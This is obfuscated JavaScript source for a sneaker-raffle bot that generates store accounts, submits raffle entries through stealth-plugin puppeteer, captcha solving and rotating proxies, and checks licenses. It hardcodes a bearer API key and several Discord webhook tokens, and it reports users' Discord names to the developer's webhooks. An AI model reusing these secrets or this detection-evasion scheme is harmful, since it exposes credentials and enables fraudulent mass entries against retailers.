const { EmbedBuilder: _0x5e69ff } = require('discord.js');
var _0x2a8159 = require('exe');
const { execFile: _0x1444ea } = require('child_process'), _0x168014 = require('puppeteer-extra'), _0x374957 = require('puppeteer-extra-plugin-recaptcha'), _0x4554c9 = require('puppeteer-extra-plugin-stealth'), _0x41434e = require('chalk'), _0x4bfd08 = require('node-bash-title'), _0x76f3de = require('fs'), _0x4d5334 = require('axios'), _0x3c083c = require('papaparse');
var _0x42bce6 = require('random-name');
const _0x3c3188 = require('request');
var _0x407c67 = require('prompt');
const _0x2ae52a = _0x3c3188['jar']();
var _0xd30cf5 = {};
const _0x2c5dd4 = '1067398661929181186/wvxr1d4nwFDFE-hAKBisU_mVWLloqatitfWvCqqIv38EUYiJMm_Pr3VKsuLsUBKN3PPj', _0x1a9530 = '1067398856721051719/2gS-h641y_RoqR-KZ5aOcrnDfvvXNQIz4uQv8eA8A5_nsRSJlaCaStreLwCu5lmUjO4H', _0x159c57 = '1068515411877957743/t_TXlLhYbeQmPL19hyGeNqi1G0KPT8KCBYOVOcryGMvXPfIUBEpNZRBCC1j7OFRej4A6', _0x46643a = '1068519704525807616/luGgvM1ZbR7g1zM5-10y5yceL2OGVCjrlkB6XxQL-hdoHUJ6hwSVAn6vVNyieHWLqPHE', _0x32be2a = '1070657276525940746/GSfXwIxjuRjwmP3sTDw73M4V2P5OJqMFgZyECtpBwFmtXGINvj1xFsVsZ2KwGBpJNHpn', _0xd54d1e = '1072865476457287711/EePVQu0bb06IdHG3FfG7M-JDaE-38prupCPoCqaduP6mG_tsshUSaKidyfyVx0YgNC7e';
var _0xf00680 = 'https://discord.com/api/webhooks/', _0x3ff8ce = '' + _0xf00680 + _0x159c57, _0x22ad4d = '' + _0xf00680 + _0x46643a, _0x45c968 = '' + _0xf00680 + _0x2c5dd4, _0x3afc50 = '' + _0xf00680 + _0x1a9530, _0x302219 = '' + _0xf00680 + _0x32be2a, _0x5e1d93 = '' + _0xf00680 + _0xd54d1e;
const _0x375861 = JSON['parse'](_0x76f3de['readFileSync']('../package.json', 'utf-8')), _0x26b8e9 = _0x375861['version'];
var _0x493993, _0x42a4ad, _0x1eb2b9, _0x477616, _0x52d497, _0x39687a, _0x434d06, _0x2a15ce;
const _0x38ffc8 = 'pk_7R7rRwMpveiR8OufEx9xIDMdU8Y95GgvGLF59wWRqklMwhXdpDnh5sN2KfaPHjEe';
let _0x3c0d2d = ![];
const _0x4d6d87 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', _0x296614 = '0123456789';
var _0x1defe2 = _0x4d6d87['split']('');
const _0x2606ed = require('auto-git-update'), { PageEmittedEvents: _0x3c57c4 } = require('puppeteer'), { getRandomValues: _0x538b2a } = require('crypto'), { resolve: _0x2e2315 } = require('path'), { Console: _0x2ca205 } = require('console'), _0x443098 = {
    'repository': 'https://github.com/Jarno97/JRafflesBot',
    'branch': 'main',
    'fromReleases': ![],
    'tempLocation': 'C:/temp/jraffles',
    'ignoreFiles': [
        'settings.json',
        'proxies.txt',
        'tasks/maha.csv',
        'tasks/footshop.csv',
        'tasks/afew.csv',
        'tasks/oqium.csv',
        'tasks/patta.csv',
        'accounts/patta.csv',
        'tasks/kickz.csv',
        'accounts/kickz-verified.csv',
        'accounts/kickz-unverified.csv'
    ]
}, _0x273643 = new _0x2606ed(_0x443098);
async function _0xa2535b() {
    _0x52d497 = _0x76f3de['readdirSync']('../proxies'), _0x477616 = _0x76f3de['readdirSync']('../tasks'), !_0x76f3de['existsSync']('../accounts/fenom.csv') && _0x76f3de['writeFileSync']('../accounts/fenom.csv', 'Email,Password\x0a'), !_0x76f3de['existsSync']('../accounts/bstn.csv') && _0x76f3de['writeFileSync']('../accounts/bstn.csv', 'Email,Password\x0a'), _0xd30cf5 = JSON['parse'](_0x76f3de['readFileSync']('../settings.json', 'utf-8')), !_0xd30cf5['delay'] && (_0xd30cf5['delay'] = 0x2710, _0x76f3de['writeFileSync']('../settings.json', JSON['stringify'](_0xd30cf5))), !_0xd30cf5['captchaKey'] && (_0xd30cf5['captchaKey'] = '', _0x76f3de['writeFileSync']('../settings.json', JSON['stringify'](_0xd30cf5))), !_0xd30cf5['useRandomProxy'] && (_0xd30cf5['useRandomProxy'] = !![], _0x76f3de['writeFileSync']('../settings.json', JSON['stringify'](_0xd30cf5))), !_0xd30cf5['webhook'] && (_0xd30cf5['webhook'] = '', _0x76f3de['writeFileSync']('../settings.json', JSON['stringify'](_0xd30cf5))), _0xd30cf5['MahaDelay'] = _0xd30cf5['delay'], _0xf00680 = _0xd30cf5['webhook'], _0x39687a = _0xd30cf5['licenseKey'];
}
let _0x2ab596, _0x2fd131 = [], _0x363544;
const _0x4f800b = _0x25076f => new Promise(_0x596eca => setTimeout(_0x596eca, _0x25076f));
function _0x56db67(_0x41fcb3, _0x10c3ae) {
    return Math['floor'](Math['random']() * (_0x10c3ae - _0x41fcb3 + 0x1) + _0x41fcb3);
}
async function _0xd1aa21(_0x2e2e5d) {
    return _0x4d5334['get']('https://api.hyper.co/v4/licenses/' + _0x2e2e5d, { 'headers': { 'Authorization': 'Bearer\x20' + _0x38ffc8 } })['then'](_0x2ba6d2 => _0x2ba6d2['data'])['catch'](() => null);
}
;
async function _0x532d54(_0x41edca) {
    console['clear']();
    if (_0x41edca == 'AWGH-0N92-JE6S-HOHU') {
        console['log']('Please\x20paste\x20your\x20key\x20here:');
        var _0x3ebe1b = await _0x407c67['get']('License');
        if (_0x3ebe1b['License'] == 'AWGH-0N92-JE6S-HOHU')
            return console['log']('Error\x20please\x20use\x20the\x20key\x20on\x20the\x20JRaffles\x20dashboard'), await _0x4f800b(0xbb8), _0x532d54(_0x41edca);
        _0x41edca = _0x3ebe1b['License'], _0xd30cf5['licenseKey'] = _0x41edca, _0x39687a = _0x41edca, _0x76f3de['writeFileSync']('../settings.json', JSON['stringify'](_0xd30cf5));
    }
    console['log']('Checking\x20license\x20' + _0x39687a + '...'), await _0x4f800b(0x320);
    const _0x1e5d5f = await _0xd1aa21(_0x41edca);
    _0x434d06 = JSON['stringify'](_0x1e5d5f['user']['discord']['username'])['substring'](0x1)['slice'](0x0, -0x1), _0x2a15ce = JSON['stringify'](_0x1e5d5f['user']['discord']['avatar'])['substring'](0x1)['slice'](0x0, -0x1);
    if (!_0x1e5d5f)
        return console['log']('License\x20not\x20found');
    if (!_0x1e5d5f['user'])
        return console['log']('License\x20not\x20bound');
    return _0x1e5d5f['status'] === 'active' ? (console['log']('License\x20is\x20good\x20to\x20go!'), _0x3c0d2d = !![]) : (console['log']('Could\x20not\x20find\x20license..'), _0x3c0d2d = ![]);
}
async function _0x29301a() {
    var _0x58b3d8 = await _0x407c67['get']('Module');
    return console['clear'](), _0x58b3d8['Module'];
}
;
async function _0x56fb99() {
    var _0x19a0e6 = await _0x407c67['get']('Setting');
    return console['clear'](), _0x19a0e6['Setting'];
}
async function _0x5d0688() {
    console['clear'](), console['log']('Choose\x20A\x20File\x20to\x20Run\x20\x0a');
    for (var _0x56ec75 = 0x0; _0x56ec75 < _0x477616['length']; _0x56ec75++) {
        console['log']('\x20(' + _0x56ec75 + ')\x20' + _0x477616[_0x56ec75]);
    }
    console['log']('');
    var _0x34a88a = await _0x407c67['get']('Task');
    if (_0x34a88a['Task'] > _0x477616['length'] - 0x1 || isNaN(_0x34a88a['Task']) == !![])
        return console['log']('Invalid\x20selection'), await _0x4f800b(0x3e8), _0x5d0688();
    var _0x442b3e = _0x76f3de['readFileSync']('../tasks/' + _0x477616[_0x34a88a['Task']], 'utf-8');
    return _0x1eb2b9 = _0x3c083c['parse'](_0x442b3e, { 'header': !![] })['data'], console['clear'](), console['log']('Running\x20' + _0x41434e['blue'](_0x477616[_0x34a88a['Task']])), _0x493993 = _0x477616[_0x34a88a['Task']], _0x1eb2b9;
}
async function _0x12f1e3() {
    console['clear'](), console['log']('Choose\x20Proxies\x20to\x20Use\x20\x0a');
    for (var _0x4d061c = 0x0; _0x4d061c < _0x52d497['length']; _0x4d061c++) {
        console['log']('\x20(' + _0x4d061c + ')\x20' + _0x52d497[_0x4d061c]);
    }
    console['log']('');
    var _0x340fa9 = await _0x407c67['get']('Proxies');
    if (_0x340fa9['Proxies'] > _0x52d497['length'] - 0x1 || isNaN(_0x340fa9['Proxies']) == !![])
        return console['log']('Invalid\x20selection'), await _0x4f800b(0x3e8), _0x12f1e3();
    var _0x1e3413 = _0x76f3de['readFileSync']('../proxies/' + _0x52d497[_0x340fa9['Proxies']], 'utf-8')['split']('\x0a');
    let _0x1586eb = _0x1e3413['map']((_0x4056ba, _0x41a556) => {
        sanatizeProxy = _0x4056ba['replace']('\x0d', '');
        if (_0x1e3413[_0x41a556 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x42a4ad = _0x52d497[_0x340fa9['Proxies']], console['clear'](), _0x1586eb;
}
async function _0x5ac7ee() {
    var _0x4be58f = await _0x407c67['get']('Value');
    return console['clear'](), _0x4be58f['Value'];
}
async function _0x4c3b5d(_0x2d9342) {
    console['clear'](), console['log']('What\x20would\x20you\x20like\x20to\x20do?\x20\x0a');
    for (var _0x43ab20 = 0x0; _0x43ab20 < _0x2d9342['length']; _0x43ab20++) {
        console['log']('\x20(' + _0x43ab20 + ')\x20[' + _0x2d9342[_0x43ab20]['name'] + ']');
    }
    ;
    console['log']('');
    var _0x20c48e = await _0x407c67['get']('Module');
    return _0x20c48e['Module'];
}
async function _0x4f104b() {
    var _0x41d819 = await _0x407c67['get']('Password');
    return console['clear'](), _0x41d819['Password'];
}
;
async function _0x20de83() {
    var _0x30e6f3 = await _0x407c67['get']('Links');
    return _0x30e6f3['Links'];
}
;
async function _0x2755db() {
    console['log']('Choose\x20a\x20Raffle\x20to\x20enter:\x20\x0a');
    for (var _0x1631c3 = 0x0; _0x1631c3 < _0x2fd131['length']; _0x1631c3++) {
        console['log']('\x20(' + _0x1631c3 + ')\x20' + _0x2fd131[_0x1631c3]);
    }
    ;
    console['log']();
    let _0x3dc8cf = await _0x407c67['get']('Product');
    return console['clear'](), _0x3dc8cf['Product'];
}
;
function _0x57a400() {
    var _0x39ec59 = new Date(Date['now']())['toLocaleTimeString']();
    return _0x39ec59;
}
;
const _0x388f09 = [
    {
        'name': 'AFEW\x20Store',
        'modules': [{
            'name': 'AFEW\x20Raffle\x20Entries',
            'store': 'AFEW',
            'logo': 'https://d19kzigy6tpscu.cloudfront.net/media/CACHE/images/logo_thumbnail/afew_logo_100x100_1647428869.png'
        }]
    },
    {
        'name': 'BSTN',
        'modules': [
            {
                'name': 'BSTN\x20Account\x20Generator',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png'
            },
            {
                'name': 'BSTN\x20Account\x20Verifier',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png'
            },
            {
                'name': 'BSTN\x20Raffle\x20Entries',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png'
            }
        ]
    },
    {
        'name': 'FENOM',
        'modules': [
            {
                'name': 'FENOM\x20Account\x20Generator',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg'
            },
            {
                'name': 'FENOM\x20Raffle\x20Entries',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg'
            }
        ]
    },
    {
        'name': 'FOOTSHOP',
        'modules': [{
            'name': 'FOOTSHOP\x20Raffle\x20Entries',
            'store': 'Footshop',
            'logo': 'https://images.easyfundraising.org.uk/retailer/cropped/logo-footshop-1615542072.png'
        }]
    },
    {
        'name': 'JD',
        'modules': [{
            'name': 'JD\x20Raffle\x20Entries',
            'store': 'JD',
            'logo': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/d8/JD_Sports_logo.svg/2048px-JD_Sports_logo.svg.png'
        }]
    },
    {
        'name': 'KICKZ',
        'modules': [
            {
                'name': 'KICKZ\x20Account\x20Generator',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b'
            },
            {
                'name': 'KICKZ\x20Raffle\x20Entries',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b'
            }
        ]
    },
    {
        'name': 'MAHA\x20Amsterdam',
        'modules': [
            {
                'name': 'MAHA\x20Raffle\x20Entries',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=THxSew',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'VFB8Tq',
                            'custom_source': 'Air\x20Jordan\x204\x20Seafoam',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'RW67e2',
                                '$consent_form_version': 0x7d2f63,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                }
            },
            {
                'name': 'MAHA\x20Raffle\x20Verification',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                }
            }
        ]
    },
    {
        'name': 'OQIUM\x20Store',
        'modules': [
            {
                'name': 'OQIUM\x20Raffle\x20Entries',
                'store': 'OQIUM',
                'logo': 'https://s3-eu-west-1.amazonaws.com/tpd/logos/5e8e742e8f9bb4000118f0bc/0x0.png',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=R3sbqs',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'WdVw7N',
                            'custom_source': 'DV3742-021',
                            'email': '',
                            'properties': {
                                '$first_name': '',
                                '$last_name': '',
                                '$phone_number': '',
                                'Size': '',
                                'Instagram\x20Account': '',
                                '$address1': '',
                                '$zip': '',
                                '$city': '',
                                '$country': '',
                                'Accepts\x20Marketing': ['NoByRaffle'],
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'S8GH2D',
                                '$consent_form_version': 0x7d9216,
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://oqium.com',
                    'referer': 'https://oqium.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                }
            },
            {
                'name': 'OQIUM\x20Raffle\x20Verification',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                }
            }
        ]
    },
    {
        'name': 'PATTA',
        'modules': [
            {
                'name': 'PATTA\x20Account\x20Generator',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562'
            },
            {
                'name': 'PATTA\x20Raffle\x20Entries',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562'
            }
        ]
    },
    {
        'name': 'SLAM\x20JAM',
        'modules': [
            {
                'name': 'SLAM\x20JAM\x20Account\x20Generator',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505'
            },
            {
                'name': 'SLAM\x20JAM\x20Raffle\x20Entries',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505'
            }
        ]
    },
    { 'name': 'Paypal\x20Verification' },
    { 'name': 'Change\x20Settings' },
    { 'name': 'Reload\x20Settings' }
];
async function _0x5f2c92(_0x5e4a08, _0xd6e897) {
    let _0x309cf3 = { 'headers': { 'content-type': 'application/json' } };
    if (_0x26b8e9 != 'devkey') {
        await _0x4d5334['post'](_0x5e4a08, _0xd6e897, _0x309cf3);
        return;
    }
    return console['log']('devkey\x20settings\x20enabled,\x20not\x20sending\x20webhooks');
}
;
async function _0xff2c9f(_0x5d096e, _0x550cc4, _0xf424b8, _0x404360, _0x2922c2) {
    if (!_0x404360 && _0xf424b8 == 'dev') {
        var _0x21c080 = new _0x5e69ff()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Raffle\x20Entry')['setAuthor']({
            'name': 'JRaffles',
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
            'url': 'https://twitter.com/JRaffles_'
        })['setThumbnail'](_0x550cc4['logo'])['addFields']({
            'name': 'Store',
            'value': '' + _0x550cc4['store'],
            'inline': !![]
        })['addFields']({
            'name': 'Size',
            'value': '' + _0x5d096e['Size'],
            'inline': !![]
        })['addFields']({
            'name': 'Delay',
            'value': '' + _0xd30cf5['delay'],
            'inline': !![]
        })['addFields']({
            'name': 'User',
            'value': '' + _0x434d06,
            'inline': !![]
        })['addFields']({
            'name': 'URL',
            'value': '' + _0x5d096e['Url'],
            'inline': !![]
        })['setTimestamp']()['setFooter']({
            'text': 'JRaffles\x20v' + _0x26b8e9,
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
        });
        return _0x21c080['data'];
    } else {
        if (_0x404360 && _0xf424b8 == 'dev') {
            var _0x21c080 = new _0x5e69ff()['setColor'](0xc0d6d6)['setTitle']('Failed\x20Raffle\x20Entry')['setAuthor']({
                'name': 'JRaffles',
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                'url': 'https://twitter.com/JRaffles_'
            })['setThumbnail'](_0x550cc4['logo'])['addFields']({
                'name': 'User',
                'value': '' + _0x434d06,
                'inline': !![]
            }, {
                'name': 'Store',
                'value': '' + _0x550cc4['store'],
                'inline': !![]
            }, {
                'name': 'Size',
                'value': '' + _0x5d096e['Size'],
                'inline': !![]
            }, {
                'name': 'Delay',
                'value': '' + _0xd30cf5['delay'],
                'inline': !![]
            })['addFields']({
                'name': 'ERROR',
                'value': '' + _0x2922c2,
                'inline': !![]
            })['addFields']({
                'name': 'URL',
                'value': '' + _0x5d096e['Url']
            })['setTimestamp']()['setFooter']({
                'text': 'JRaffles\x20v' + _0x26b8e9,
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
            });
            return _0x21c080['data'];
        } else {
            if (_0xf424b8 == 'pub') {
                var _0x21c080 = new _0x5e69ff()['setColor'](0xc0d6d6)['setTitle']('Succesful\x20Raffle\x20Entry')['setAuthor']({
                    'name': 'JRaffles',
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                    'url': 'https://twitter.com/JRaffles_'
                })['setThumbnail'](_0x550cc4['logo'])['addFields']({
                    'name': 'Store',
                    'value': '' + _0x550cc4['store'],
                    'inline': !![]
                }, {
                    'name': 'Size',
                    'value': '' + _0x5d096e['Size'],
                    'inline': !![]
                }, {
                    'name': 'Delay',
                    'value': '' + _0xd30cf5['delay'],
                    'inline': !![]
                })['addFields']({
                    'name': 'URL',
                    'value': '||' + _0x5d096e['Url'] + '||'
                })['setTimestamp']()['setFooter']({
                    'text': 'JRaffles\x20v' + _0x26b8e9,
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                });
                return _0x21c080['data'];
            } else {
                if (_0xf424b8 == 'acc' && !_0x404360) {
                    var _0x21c080 = new _0x5e69ff()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generated')['setAuthor']({
                        'name': 'JRaffles',
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                        'url': 'https://twitter.com/JRaffles_'
                    })['setThumbnail'](_0x550cc4['logo'])['addFields']({
                        'name': 'User',
                        'value': '' + _0x434d06,
                        'inline': !![]
                    }, {
                        'name': 'Store',
                        'value': '' + _0x550cc4['store'],
                        'inline': !![]
                    }, {
                        'name': 'Delay',
                        'value': '' + _0xd30cf5['delay'],
                        'inline': !![]
                    })['setTimestamp']()['setFooter']({
                        'text': 'JRaffles\x20v' + _0x26b8e9,
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                    });
                    return _0x21c080['data'];
                } else {
                    if (_0xf424b8 == 'acc' && _0x404360) {
                        var _0x21c080 = new _0x5e69ff()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generation\x20Failed')['setAuthor']({
                            'name': 'JRaffles',
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                            'url': 'https://twitter.com/JRaffles_'
                        })['setThumbnail'](_0x550cc4['logo'])['addFields']({
                            'name': 'User',
                            'value': '' + _0x434d06,
                            'inline': !![]
                        }, {
                            'name': 'Error',
                            'value': '' + _0x2922c2,
                            'inline': !![]
                        }, {
                            'name': 'Store',
                            'value': '' + _0x550cc4['store'],
                            'inline': !![]
                        }, {
                            'name': 'Delay',
                            'value': '' + _0xd30cf5['delay'],
                            'inline': !![]
                        })['setTimestamp']()['setFooter']({
                            'text': 'JRaffles\x20v' + _0x26b8e9,
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                        });
                        return _0x21c080['data'];
                    } else {
                        if (_0xf424b8 == 'open') {
                            var _0x21c080 = new _0x5e69ff()['setColor'](0xc0d6d6)['setTitle']('User\x20Opened\x20JRaffles')['setAuthor']({
                                'name': 'JRaffles',
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                'url': 'https://twitter.com/JRaffles_'
                            })['setThumbnail'](_0x2a15ce)['addFields']({
                                'name': 'User',
                                'value': '' + _0x434d06,
                                'inline': !![]
                            })['setTimestamp']()['setFooter']({
                                'text': 'JRaffles\x20v' + _0x26b8e9,
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                            });
                            return _0x21c080['data'];
                        } else {
                            if (!_0x404360 && _0xf424b8 == 'ver') {
                                var _0x21c080 = new _0x5e69ff()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Verification')['setAuthor']({
                                    'name': 'JRaffles',
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                    'url': 'https://twitter.com/JRaffles_'
                                })['setThumbnail'](_0x550cc4['logo'])['addFields']({
                                    'name': 'User',
                                    'value': '' + _0x434d06,
                                    'inline': !![]
                                }, {
                                    'name': 'Store',
                                    'value': '' + _0x550cc4['store'],
                                    'inline': !![]
                                }, {
                                    'name': 'Delay',
                                    'value': '' + _0xd30cf5['delay'],
                                    'inline': !![]
                                })['setTimestamp']()['setFooter']({
                                    'text': 'JRaffles\x20v' + _0x26b8e9,
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                });
                                return _0x21c080['data'];
                            } else {
                                if (_0x404360 && _0xf424b8 == 'ver') {
                                    var _0x21c080 = new _0x5e69ff()['setColor'](0xc0d6d6)['setTitle']('Verification\x20Failed')['setAuthor']({
                                        'name': 'JRaffles',
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                        'url': 'https://twitter.com/JRaffles_'
                                    })['setThumbnail'](_0x550cc4['logo'])['addFields']({
                                        'name': 'User',
                                        'value': '' + _0x434d06,
                                        'inline': !![]
                                    }, {
                                        'name': 'Error',
